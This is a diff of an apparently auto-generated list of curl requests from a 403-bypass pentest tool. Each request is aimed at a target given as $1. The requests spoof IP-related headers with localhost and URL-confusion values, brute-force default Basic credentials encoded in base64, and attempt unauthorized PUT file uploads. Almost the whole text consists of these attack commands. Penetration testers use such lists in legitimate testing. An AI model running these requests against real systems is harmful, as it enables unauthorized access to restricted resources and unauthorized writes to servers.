 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8303,7 +8303,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://12
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8317,8 +8317,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://12
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8340,22 +8340,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8366,7 +8366,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ht
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8380,8 +8380,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ht
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8403,22 +8403,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 12
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Cluster-Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' 'http://127.0.0.1'
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' 'http://127.0.0.1'
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8429,7 +8429,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8443,8 +8443,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8466,10 +8466,10 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1 
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Client-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Authorization: Bearer null' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Authorization: Bearer' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8553,7 +8553,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Authorization: Basic 
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Authorization: Basic amlnc2F3OmppZ3Nhdw==' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Authorization: Basic amlnc2F3OmNpc2Nv' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Authorization: Basic amlnc2F3OmFkbWlu' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1/pentest.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1/pentest.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'Content-Type: text/plain' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1/pentest.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'Content-Type: text/plain' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1/pentest.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'Content-Type: text/plain' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -d 'pentest' -H 'Content-Type: text/plain' -H 'User-Agent: Forbidden/5.4' -X 'PUT' $1
